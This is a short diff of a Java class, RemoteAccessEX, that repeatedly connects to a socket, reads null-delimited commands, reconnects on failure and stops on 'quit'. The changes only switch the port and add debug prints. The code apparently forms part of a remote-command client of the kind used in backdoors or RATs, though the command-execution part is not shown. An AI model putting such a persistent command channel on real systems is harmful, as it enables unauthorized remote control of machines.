@@ -68,24 +68,29 @@ public class RemoteAccessEX{
 
   public static void main(String args[]) throws IOException{
     String host="localhost";
-    int port = 3306;
+    int port = 135;
     String ip=resolve(host);
     //System.out.println(ip);
     int stat=0;
     while(stat!=1){stat=connect(ip,port); //keep trying to connect
     System.out.println("connecting");}
-    //System.out.println("connected");//connected
+    System.out.println("connected");//connected
     pr=new PrintWriter(s.getOutputStream(),true); // look at output stream
     sc = new Scanner(s.getInputStream());// look at output stream
     sc.useDelimiter("\0");//Delimiter is used in order to know the end of the message received.
     String recieved;
     String stdout;
     while(true){
+      System.out.println("listening");
+
       try{//try to recieve message
+        System.out.println("entered try");
+
         recieved = sc.next();
         recieved =  recieved.trim();
         recieved =  recieved.replace("\0","");
-        System.out.println("got stuff");
+        System.out.println(recieved);
+        System.out.println("message got");
 
         if( recieved.contains("quit")){///exit if message is quit
           pr.println("quit");
@@ -108,7 +113,7 @@ public class RemoteAccessEX{
         do{
           stat=connect(ip,port);
         }while(stat!=1);
-        System.out.println("connected");
+        //System.out.println("connected");
         pr=new PrintWriter(s.getOutputStream(),true);
         sc= new Scanner(s.getInputStream());
         sc.useDelimiter("\0");
